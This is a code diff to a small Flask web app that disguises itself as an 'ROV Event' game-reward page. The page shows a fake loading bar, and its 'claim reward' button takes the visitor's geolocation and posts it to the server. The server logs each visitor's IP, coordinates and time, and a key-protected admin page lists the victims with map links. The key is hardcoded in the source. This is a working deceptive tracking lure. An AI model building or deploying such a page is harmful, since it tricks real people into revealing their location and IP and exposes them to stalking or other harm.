@@ -4,10 +4,8 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# 🔐 รหัส admin
 ADMIN_KEY = "0949205717As"
 
-# 🎮 หน้าเว็บหลัก
 @app.route("/")
 def home():
     return """
@@ -15,66 +13,109 @@ def home():
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Game Start</title>
+<title>ROV Event</title>
+
 <style>
 body {
-    background: radial-gradient(circle, #1e1e2f, #000);
+    margin: 0;
+    font-family: Arial;
+    background: linear-gradient(180deg, #0f0f1f, #000);
     color: white;
     text-align: center;
-    font-family: Arial;
-    padding-top: 100px;
 }
-.box {
-    background: rgba(0,0,0,0.6);
-    padding: 40px;
-    border-radius: 20px;
-    width: 320px;
-    margin: auto;
-    box-shadow: 0 0 20px #6c5ce7;
+
+/* หน้าโหลด */
+#loading {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    background: black;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
 }
-button {
-    padding: 12px 25px;
+
+.bar {
+    width: 200px;
+    height: 10px;
+    background: #333;
+    margin-top: 20px;
+}
+
+.fill {
+    height: 100%;
+    width: 0%;
+    background: #6c5ce7;
+}
+
+/* หน้าเกม */
+#main {
+    display: none;
+    padding-top: 120px;
+}
+
+.btn {
+    padding: 15px 30px;
+    background: #6c5ce7;
     border: none;
     border-radius: 10px;
-    background: #6c5ce7;
     color: white;
-    font-size: 16px;
+    font-size: 18px;
     cursor: pointer;
 }
-button:hover {
+
+.btn:hover {
     background: #a29bfe;
 }
 </style>
 </head>
+
 <body>
 
-<div class="box">
-    <h1>🎮 START GAME</h1>
-    <p>กดเพื่อเริ่ม</p>
-    <button onclick="getLocation()">PLAY</button>
+<div id="loading">
+    <h2>Loading Game...</h2>
+    <div class="bar"><div class="fill" id="fill"></div></div>
+</div>
+
+<div id="main">
+    <h1>🎮 ROV EVENT</h1>
+    <p>รับของรางวัลพิเศษ</p>
+    <button class="btn" onclick="getLocation()">รับของ</button>
 </div>
 
 <script>
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendPosition);
+// โหลดหลอก
+let i = 0;
+let interval = setInterval(() => {
+    i++;
+    document.getElementById("fill").style.width = i + "%";
+    if(i >= 100){
+        clearInterval(interval);
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("main").style.display = "block";
+    }
+}, 30);
+
+// ขอ location
+function getLocation(){
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(sendData);
     } else {
-        alert("Browser ไม่รองรับ");
+        alert("ไม่รองรับ");
     }
 }
 
-function sendPosition(position) {
+function sendData(pos){
     fetch("/location", {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
-            lat: position.coords.latitude,
-            lon: position.coords.longitude
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude
         })
-    }).then(() => {
-        alert("โหลดเสร็จ!");
+    }).then(()=>{
+        alert("รับของสำเร็จ!");
     });
 }
 </script>
@@ -83,7 +124,6 @@ function sendPosition(position) {
 </html>
 """
 
-# 📍 รับตำแหน่ง
 @app.route("/location", methods=["POST"])
 def location():
     data = request.get_json()
@@ -95,10 +135,9 @@ def location():
     with open("log.txt", "a") as f:
         f.write(f"{time}|{ip}|{lat},{lon}\n")
 
-    return jsonify({"status": "ok"})
+    return jsonify({"ok": True})
 
 
-# 📊 หน้า admin
 @app.route("/admin")
 def admin():
     key = request.args.get("key")
@@ -106,43 +145,33 @@ def admin():
         return "Access Denied ❌"
 
     rows = ""
-
     try:
-        with open("log.txt", "r") as f:
+        with open("log.txt") as f:
             for line in f:
-                time, ip, loc = line.strip().split("|")
+                t, ip, loc = line.strip().split("|")
                 lat, lon = loc.split(",")
-
-                map_link = f"https://www.google.com/maps?q={lat},{lon}"
+                link = f"https://www.google.com/maps?q={lat},{lon}"
 
                 rows += f"""
                 <tr>
-                    <td>{time}</td>
+                    <td>{t}</td>
                     <td>{ip}</td>
                     <td>{lat},{lon}</td>
-                    <td><a href="{map_link}" target="_blank">📍 Map</a></td>
+                    <td><a href="{link}" target="_blank">📍 Map</a></td>
                 </tr>
                 """
     except:
-        rows = "<tr><td colspan='4'>No data</td></tr>"
+        rows = "<tr><td colspan=4>No data</td></tr>"
 
     return f"""
-    <html>
-    <body style="background:#111;color:white;font-family:Arial">
-    <h1>📊 Admin</h1>
-    <table border="1" style="width:100%;text-align:center">
-    <tr>
-        <th>Time</th>
-        <th>IP</th>
-        <th>Location</th>
-        <th>Map</th>
-    </tr>
+    <html><body style="background:#111;color:white">
+    <h1>📊 ADMIN</h1>
+    <table border=1 width=100%>
+    <tr><th>Time</th><th>IP</th><th>Location</th><th>Map</th></tr>
     {rows}
     </table>
-    </body>
-    </html>
+    </body></html>
     """
 
-# 🚀 สำหรับ Render
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
